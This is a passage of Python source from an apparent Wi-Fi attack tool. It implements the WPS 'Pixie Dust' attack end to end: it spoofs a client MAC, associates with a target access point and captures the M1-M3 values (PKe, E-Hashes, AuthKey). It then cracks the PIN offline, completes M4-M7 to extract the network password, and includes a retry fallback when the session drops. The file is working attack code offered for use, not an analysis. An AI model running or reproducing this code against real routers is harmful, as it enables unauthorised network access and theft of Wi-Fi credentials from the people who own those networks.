    assumed = await iface.set_fake_mac(mac_to_str(our_mac), bssid)
    if assumed:
        our_mac = str_to_mac(assumed)
    else:
        capture.notes.append(
            "this adapter cannot hardware-ACK a spoofed MAC (active monitor); "
            "the AP may ignore the exchange"
        )
        if ui:
            ui.warn(capture.notes[-1])

    assoc = Association(
        iface, ap.bssid, ap.ssid, ap.channel, our_mac=our_mac,
        assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR, wsc_20),
    )
    transport = WlanTransport(iface, bssid, our_mac)
    assoc.start()
    transport.start()
    try:
        if ui:
            ui.info(f"associating with {ap.bssid} ({ap.ssid!r}, ch {ap.channel}) ...")
        if not await assoc.associate():
            raise util.PixieError(
                f"{ap.bssid}: association refused - {assoc.fail_reason or 'no answer'}\n"
                "  check the channel/SSID, and that the AP is not blocking new clients"
            )
        if ui:
            ui.info("association ok - waiting for WPS M1 ...")
        await _exchange_m1_m3(transport, ap, bssid, our_mac, wsc_20, timeout,
                              capture, ui)
        return capture
    finally:
        transport.stop()
        assoc.stop()
        try:
            await iface.send_no_wait(build_client_leaving(bssid, our_mac))
        except Exception:
            pass
        try:
            await iface.clear_fake_mac()
        except Exception:
            pass
        try:
            await iface.disable_rx_acks()
        except Exception:
            pass


async def _exchange_m1_m3(transport, ap: AccessPoint, bssid: bytes, our_mac: bytes,
                          wsc_20: bool, timeout: float, capture: Capture, ui) -> None:
    """Drive EAPOL-Start -> M1 -> M2 -> M3, then stop (never send M4)."""
    from wifit3.dot11.wsc import crypto as wc
    from wifit3.dot11.wsc import messages as M

    priv, pkr = wc.dh_generate_keypair()
    nonce_r = os.urandom(wc.NONCE_LEN)
    uuid_r = os.urandom(16)

    start = _data_frame(M, bssid, our_mac, M.eapol_start())
    await transport.send_no_wait(start)

    deadline = time.monotonic() + timeout
    window = 8.0
    pke = nonce_e = mac_e = authkey = None
    m2_attrs = last_frame = None
    saw_m1 = False
    while time.monotonic() < deadline:
        remaining = deadline - time.monotonic()
        frame = await transport.recv(min(window, max(0.1, remaining)))
        window = 5.0
        if frame is None:
            # Re-send whatever the AP is waiting for (injected frames are un-ACKed).
            await transport.send_no_wait(last_frame or start)
            continue

        parsed = M.parse_rx_frame(frame)
        if parsed is None:
            continue

        if parsed.is_identity_request:
            await transport.send_no_wait(_data_frame(
                M, bssid, our_mac, M.eap_identity_response(parsed.eap_id)))
            continue

        if parsed.is_eap_failure or parsed.wsc_msg_type == M.WPS_WSC_NACK:
            code = _config_error(parsed)
            raise util.PixieError(
                f"{ap.bssid}: the AP refused WPS ({_config_error_name(code)}).\n"
                "  it may be locked, or it may not accept an external registrar PIN"
            )

        msg_type = parsed.wsc_msg_type
        if msg_type == M.WPS_M1:
            pke = parsed.attrs.get(M.ATTR_PUBLIC_KEY)
            nonce_e = parsed.attrs.get(M.ATTR_ENROLLEE_NONCE)
            mac_e = parsed.attrs.get(M.ATTR_MAC_ADDR, bssid)
            if not pke or len(pke) != wc.PUBKEY_LEN:
                raise util.PixieError("M1 has no valid enrollee public key (PKe)")
            if not nonce_e or len(nonce_e) != wc.NONCE_LEN:
                raise util.PixieError("M1 has no valid enrollee nonce (E-Nonce)")
            shared = wc.dh_shared_secret(pke, priv)
            authkey, _keywrapkey, _emsk = wc.derive_keys(shared, nonce_e, mac_e, nonce_r)
            m2 = M.build_m2(nonce_e, nonce_r, uuid_r, pkr, authkey,
                            parsed.raw_wsc_attrs,
                            M.rf_band_for_channel(ap.channel), wsc_20)
            m2_attrs = m2
            last_frame = _data_frame(
                M, bssid, our_mac,
                M.eap_wsc_response(parsed.eap_id, M.WSC_MSG, m2))
            await transport.send_no_wait(last_frame)
            if not saw_m1:
                saw_m1 = True
                if ui:
                    ui.info(f"M1 received ({len(pke)}B PKe) - sent M2, waiting for M3")
            continue

        if msg_type == M.WPS_M3:
            if authkey is None or nonce_e is None:
                raise util.PixieError("M3 arrived before M1 - restart the attempt")
            e_hash1 = parsed.attrs.get(M.ATTR_E_HASH1)
            e_hash2 = parsed.attrs.get(M.ATTR_E_HASH2)
            if not e_hash1 or not e_hash2:
                raise util.PixieError("M3 has no E-Hash1/E-Hash2")
            if len(e_hash1) != wc.HASH_LEN or len(e_hash2) != wc.HASH_LEN:
                raise util.PixieError("M3 E-Hash values have the wrong length")

            # Sanity check: a wrong AuthKey would make every offline mode fail
            # silently.  M3_auth = HMAC(AuthKey, M2, M3*).
            body, claimed = _strip_authenticator(parsed.raw_wsc_attrs)
            if claimed and m2_attrs:
                expected = wc.authenticator(authkey, m2_attrs, body)
                if expected != claimed:
                    capture.notes.append(
                        "M3 authenticator mismatch: AuthKey may be wrong "
                        "(the AP may have restarted the exchange)"
                    )

            capture.pke = pke.hex()
            capture.pkr = pkr.hex()
            capture.e_nonce = nonce_e.hex()
            capture.e_hash1 = e_hash1.hex()
            capture.e_hash2 = e_hash2.hex()
            capture.authkey = authkey.hex()
            capture.enrollee_mac = mac_e.hex()

            # Polite abort.  We deliberately do NOT send M4: no PIN is committed,
            # so the AP has nothing to judge and no lockout counter moves.
            try:
                nack = M.build_wsc_nack(nonce_e, nonce_r)
                await transport.send_no_wait(_data_frame(
                    M, bssid, our_mac,
                    M.eap_wsc_response(parsed.eap_id, M.WSC_NACK, nack)))
            except Exception:
                pass
            if ui:
                ui.ok("M3 received - PixieDust values captured (M4 not sent)")
            return

        # M5/M7 are for a full PIN attempt (verify), stale retransmits are ignored.
        continue

    if saw_m1:
        raise util.PixieError(
            f"{ap.bssid}: got M1 but no M3 within {int(timeout)}s.\n"
            "  the AP may throttle M3, or our M2 was lost - try again with a longer --timeout"
        )
    raise util.PixieError(
        f"{ap.bssid}: the AP never started WPS (no M1).\n"
        "  WPS may be disabled, the AP may require a physical button, or it is locked"
    )


def _config_error(parsed) -> int | None:
    from wifit3.dot11.wsc import messages as M

    raw = parsed.attrs.get(M.ATTR_CONFIG_ERROR)
    if raw and len(raw) >= 2:
        return int.from_bytes(raw[:2], "big")
    return None


def _config_error_name(code: int | None) -> str:
    from wifit3.campaigns.wps.registrar import config_error_name

    return config_error_name(code)


def _outcome_to_verify_result(
    outcome,
    pin: str,
    default_ssid: str,
    flow: str,
    assoc_count: int,
) -> VerifyResult:
    from wifit3.campaigns.wps.registrar import PinResult, config_error_name

    pin_ok = outcome.result is PinResult.SUCCESS
    ok = bool(pin_ok and outcome.psk)
    cfg_code = outcome.config_error
    cfg_name = config_error_name(cfg_code) if cfg_code is not None else ""
    status_code = getattr(outcome, "status_code", "") or ""
    if not status_code:
        if ok:
            status_code = "psk_ok"
        elif pin_ok:
            status_code = "pin_ok_no_credential"
        elif cfg_code == 15:
            status_code = "locked"
        elif not outcome.reached_m1:
            status_code = "no_m1"
        elif outcome.result in (
            PinResult.FIRST_HALF_WRONG,
            PinResult.SECOND_HALF_WRONG,
            PinResult.PROTO_ERROR,
        ):
            status_code = "rejected"
        else:
            status_code = "timeout"

    detail = outcome.detail or outcome.result.value
    if status_code == "no_m1" and not outcome.reached_m1:
        detail = "الراوتر ما بداش جلسة WPS جديدة — تسنّى 60 ثانية وأعد المحاولة"

    return VerifyResult(
        attempted=bool(getattr(outcome, "m4_sent", False) or outcome.reached_m1),
        ok=ok,
        pin_ok=pin_ok,
        pin=pin or outcome.pin,
        psk=outcome.psk,
        ssid=outcome.ssid or default_ssid,
        detail=detail,
        status_code=status_code,
        config_error=cfg_code,
        config_error_name=cfg_name,
        flow=flow,
        reached_m1=bool(outcome.reached_m1),
        identity_reqs=int(getattr(outcome, "identity_reqs", 0)),
        eapol_resends=int(getattr(outcome, "eapol_resends", 0)),
        ack_failures=int(getattr(outcome, "ack_failures", 0)),
        stage=getattr(outcome, "stage", "assoc"),
        had_encrypted_settings=bool(getattr(outcome, "had_encrypted_settings", False)),
        decrypt_ok=getattr(outcome, "decrypt_ok", None),
        m4_sent=bool(getattr(outcome, "m4_sent", False)),
        assoc_count=assoc_count,
    )


async def _cleanup_wlan_session(iface, transport, assoc, bssid: bytes, our_mac: bytes) -> None:
    from wifit3.campaigns.auth_assoc import build_client_leaving

    if transport is not None:
        try:
            transport.stop()
        except Exception:
            pass
    if assoc is not None:
        try:
            assoc.stop()
        except Exception:
            pass
    try:
        await iface.send_no_wait(build_client_leaving(bssid, our_mac))
    except Exception:
        pass
    try:
        await iface.clear_fake_mac()
    except Exception:
        pass
    try:
        await iface.disable_rx_acks()
    except Exception:
        pass


async def _auto_pin_to_psk(
    iface,
    ap: AccessPoint,
    *,
    modes: list | None = None,
    deep: bool = False,
    engine: str = "native",
    auto_verify: bool = True,
    capture_timeout: float = CAPTURE_SECONDS,
    resolver_timeout: float = 9.0,
    verify_timeout: float = VERIFY_SECONDS,
    teardown_delay: float = 4.0,
    eapol_interval: float = 5.0,
    eapol_window: float = 22.0,
    backoff_delays: tuple[float, ...] = (10.0, 20.0),
    ui=None,
) -> AutoAttackResult:
    from wifit3.campaigns.auth_assoc import Association, WlanTransport
    from wifit3.campaigns.wps.registrar import WpsRegistrar
    from wifit3.dot11.mac import mac_to_str, random_client_mac, str_to_mac
    from wifit3.dot11.wsc.assoc_ie import WPS_REQ_REGISTRAR, wps_assoc_ie
    from . import wpscrack

    if not ap.bssid:
        raise util.PixieError("no BSSID: run scan first")
    if not ap.channel or ap.channel < 1 or ap.channel > 14:
        raise util.PixieError(f"{ap.bssid}: invalid channel {ap.channel}")
    if not ap.ssid:
        raise util.PixieError(f"{ap.bssid}: hidden SSID, cannot associate")

    resolved_modes = list(modes) if modes else wpscrack.resolve_modes(None, deep=deep)
    bssid = str_to_mac(ap.bssid)
    wps_log = (lambda msg: ui.info(msg)) if ui else None
    notes: list[str] = []

    if not auto_verify:
        cap = await _capture_m3(iface, ap, capture_timeout, ui)
        if ui:
            ui.info("[STAGE] OFFLINE_SEARCH")
        crack_out = await asyncio.to_thread(
            wpscrack.crack, cap.values(), engine=engine, modes=resolved_modes, ui=ui,
        )
        crack_dict = crack_out.to_dict()
        pin = crack_out.pin
        status = "verify_declined" if pin else "pin_not_found_in_session"
        verify = VerifyResult(
            attempted=False,
            ok=False,
            pin=pin or "",
            ssid=ap.ssid,
            detail="M4 skipped (user declined WPS exchange)" if pin else "offline crack found no PIN",
            status_code=status,
            flow="capture_only",
            reached_m1=True,
            stage="m3",
            m4_sent=False,
            assoc_count=1,
        )
        return AutoAttackResult(
            capture=cap,
            crack=crack_dict,
            verify=verify,
            pin_recovered=bool(pin),
            status_code=status,
            detail=verify.detail,
            flow="capture_only",
            assoc_count=1,
        )

    our_mac = random_client_mac()
    await iface.set_channel(ap.channel)
    await iface.enable_rx_acks()
    assumed = await iface.set_fake_mac(mac_to_str(our_mac), bssid)
    if assumed:
        our_mac = str_to_mac(assumed)
    else:
        notes.append(
            "this adapter cannot hardware-ACK a spoofed MAC (active monitor); "
            "the AP may ignore the exchange"
        )
        if ui:
            ui.warn(notes[-1])

    assoc = Association(
        iface, ap.bssid, ap.ssid, ap.channel, our_mac=our_mac,
        assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR, ap.wsc_2_0),
    )
    transport = WlanTransport(iface, bssid, our_mac)
    assoc.start()
    transport.start()
    assoc_count = 1
    captured_state: dict = {"capture": None, "crack": None}
    outcome = None

    try:
        if ui:
            ui.info(f"associating with {ap.bssid} ({ap.ssid!r}, ch {ap.channel}) ...")
        if not await assoc.associate():
            reason = f"{ap.bssid}: association refused - {assoc.fail_reason or 'no answer'}"
            verify = VerifyResult(
                attempted=False,
                ok=False,
                ssid=ap.ssid,
                detail=reason,
                status_code="assoc_failed",
                flow="none",
                stage="assoc",
                assoc_count=assoc_count,
            )
            return AutoAttackResult(
                capture=None,
                crack={},
                verify=verify,
                pin_recovered=False,
                status_code="assoc_failed",
                detail=reason,
                flow="none",
                assoc_count=assoc_count,
            )

        if ui:
            ui.info("association ok - waiting for WPS M1 ...")

        registrar = WpsRegistrar(
            transport,
            bssid,
            our_mac,
            ap.channel,
            ap.wsc_2_0,
            overall_timeout=max(capture_timeout, verify_timeout),
            tx_ack=True,
            ack_resends=1,
            is_associated=lambda: assoc.associated,
            log=wps_log,
        )

        async def _resolve_in_session(bundle) -> str | None:
            cap = Capture(
                ap=ap,
                pke=bundle.pke.hex(),
                pkr=bundle.pkr.hex(),
                e_nonce=bundle.e_nonce.hex(),
                e_hash1=bundle.e_hash1.hex(),
                e_hash2=bundle.e_hash2.hex(),
                authkey=bundle.authkey.hex(),
                enrollee_mac=(bundle.enrollee_mac or bssid).hex(),
                notes=list(notes),
            )
            captured_state["capture"] = cap
            if ui:
                ui.ok("M3 received - PixieDust values captured")
                ui.info("[STAGE] OFFLINE_SEARCH")
            crack_out = await asyncio.to_thread(
                wpscrack.crack,
                cap.values(),
                engine=engine,
                modes=resolved_modes,
                ui=ui,
            )
            captured_state["crack"] = crack_out
            if crack_out.pin:
                if ui:
                    ui.ok(
                        f"PIN recovered in {crack_out.seconds:.3f}s (mode: {crack_out.mode}) "
                        f"-> continuing same WSC session (M4)"
                    )
                    ui.info("[STAGE] VERIFY_PIN")
                return crack_out.pin
            return None

        outcome = await registrar.try_pin(
            pin=None,
            pin_resolver=_resolve_in_session,
            resolver_timeout=resolver_timeout,
        )
    finally:
        await _cleanup_wlan_session(iface, transport, assoc, bssid, our_mac)

    cap = captured_state["capture"]
    if cap is None and outcome is not None and outcome.pixie is not None:
        b = outcome.pixie
        cap = Capture(
            ap=ap,
            pke=b.pke.hex(),
            pkr=b.pkr.hex(),
            e_nonce=b.e_nonce.hex(),
            e_hash1=b.e_hash1.hex(),
            e_hash2=b.e_hash2.hex(),
            authkey=b.authkey.hex(),
            enrollee_mac=(b.enrollee_mac or bssid).hex(),
            notes=list(notes),
        )

    crack_out = captured_state["crack"]
    crack_dict = crack_out.to_dict() if crack_out is not None else {}
    pin = crack_out.pin if crack_out is not None else None
    verify_res = _outcome_to_verify_result(
        outcome,
        pin or "",
        ap.ssid,
        flow="same_session",
        assoc_count=assoc_count,
    )

    # Flow B fallback: ONLY if AP dropped the captured session before M4 was ever sent,
    # never after pin_not_found_in_session / rejected / locked / M7 completion.
    should_fallback = bool(
        pin
        and not verify_res.m4_sent
        and verify_res.status_code not in (
            "pin_not_found_in_session",
            "rejected",
            "locked",
            "psk_ok",
            "pin_ok_no_credential",
            "decrypt_failed",
            "aborted",
        )
    )
    if should_fallback:
        if ui:
            ui.warn("Captured session dropped before M4; attempting controlled Flow B re-association...")
        await asyncio.sleep(max(0.0, teardown_delay))
        eapol_retries = max(1, int(eapol_window / max(eapol_interval, 0.01)))
        for idx in range(2):
            if idx > 0:
                delay_s = backoff_delays[idx - 1] if idx - 1 < len(backoff_delays) else backoff_delays[-1]
                if ui:
                    ui.info(f"Flow B backoff {delay_s:.1f}s before re-association attempt {idx + 1}/2 ...")
                await asyncio.sleep(max(0.0, delay_s))

            mac2 = random_client_mac()
            await iface.set_channel(ap.channel)
            await iface.enable_rx_acks()
            assumed2 = await iface.set_fake_mac(mac_to_str(mac2), bssid)
            if assumed2:
                mac2 = str_to_mac(assumed2)

            assoc2 = Association(
                iface, ap.bssid, ap.ssid, ap.channel, our_mac=mac2,
                assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR, ap.wsc_2_0),
            )
            transport2 = WlanTransport(iface, bssid, mac2)
            assoc2.start()
            transport2.start()
            assoc_count += 1
            try:
                if not await assoc2.associate():
                    verify_res = VerifyResult(
                        attempted=False,
                        ok=False,
                        pin=pin,
                        ssid=ap.ssid,
                        detail=f"{ap.bssid}: re-association refused - {assoc2.fail_reason or 'no answer'}",
                        status_code="no_m1",
                        flow="fallback_reassoc",
                        reached_m1=False,
                        stage="assoc",
                        assoc_count=assoc_count,
                    )
                    continue

                reg2 = WpsRegistrar(
                    transport2,
                    bssid,
                    mac2,
                    ap.channel,
                    ap.wsc_2_0,
                    msg_timeout=3.0,
                    eapol_start_timeout=eapol_interval,
                    overall_timeout=max(verify_timeout, eapol_window + 10.0),
                    max_resends=2,
                    eapol_max_resends=eapol_retries,
                    tx_ack=True,
                    ack_resends=1,
                    is_associated=lambda: assoc2.associated,
                    log=wps_log,
                )
                outcome2 = await reg2.try_pin(pin=pin)
                verify_res = _outcome_to_verify_result(
                    outcome2,
                    pin,
                    ap.ssid,
                    flow="fallback_reassoc",
                    assoc_count=assoc_count,
                )
                if outcome2.m4_sent or verify_res.status_code in (
                    "psk_ok",
                    "pin_ok_no_credential",
                    "decrypt_failed",
                    "rejected",
                    "locked",
                ):
                    break
            finally:
                await _cleanup_wlan_session(iface, transport2, assoc2, bssid, mac2)

        if not verify_res.reached_m1 and not verify_res.m4_sent:
            verify_res.status_code = "no_m1"
            verify_res.detail = "الراوتر ما بداش جلسة WPS جديدة — تسنّى 60 ثانية وأعد المحاولة"

    if verify_res.ok and ui:
        ui.info("[STAGE] PASSWORD")

    return AutoAttackResult(
        capture=cap,
        crack=crack_dict,
        verify=verify_res,
        pin_recovered=bool(pin),
        status_code=verify_res.status_code,
        detail=verify_res.detail,
        flow=verify_res.flow,
        assoc_count=assoc_count,
    )


async def _verify_pin(iface, ap: AccessPoint, pin: str, timeout: float, ui) -> VerifyResult:
    from wifit3.campaigns.auth_assoc import (
        Association, WlanTransport,
    )
    from wifit3.campaigns.wps.registrar import WpsRegistrar
    from wifit3.dot11.mac import mac_to_str, random_client_mac, str_to_mac
    from wifit3.dot11.wsc.assoc_ie import WPS_REQ_REGISTRAR, wps_assoc_ie

    if not (pin.isdigit() and len(pin) in (4, 8)):
        raise util.PixieError(f"invalid PIN {pin!r}")

    bssid = str_to_mac(ap.bssid)
    our_mac = random_client_mac()
    await iface.set_channel(ap.channel)
    await iface.enable_rx_acks()
    assumed = await iface.set_fake_mac(mac_to_str(our_mac), bssid)
    if assumed:
        our_mac = str_to_mac(assumed)

    assoc = Association(
        iface, ap.bssid, ap.ssid, ap.channel, our_mac=our_mac,
        assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR, ap.wsc_2_0),
    )
    transport = WlanTransport(iface, bssid, our_mac)
    assoc.start()
    transport.start()
    wps_log = (lambda msg: ui.info(msg)) if ui else None
    try:
        if ui:
            ui.warn("verifying the PIN sends ONE real WPS attempt (M4 -> M7)")
        if not await assoc.associate():
            return VerifyResult(
                attempted=False,
                ok=False,
                pin=pin,
                ssid=ap.ssid,
                detail=f"{ap.bssid}: association refused - {assoc.fail_reason or 'no answer'}",
                status_code="assoc_failed",
                stage="assoc",
                assoc_count=1,
            )
        registrar = WpsRegistrar(
            transport, bssid, our_mac, ap.channel, ap.wsc_2_0,
            overall_timeout=timeout, tx_ack=True, ack_resends=1,
            is_associated=lambda: assoc.associated, log=wps_log)
        outcome = await registrar.try_pin(pin)
        return _outcome_to_verify_result(
            outcome,
            pin,
            ap.ssid,
            flow="verify_only",
            assoc_count=1,
        )
    finally:
        await _cleanup_wlan_session(iface, transport, assoc, bssid, our_mac)
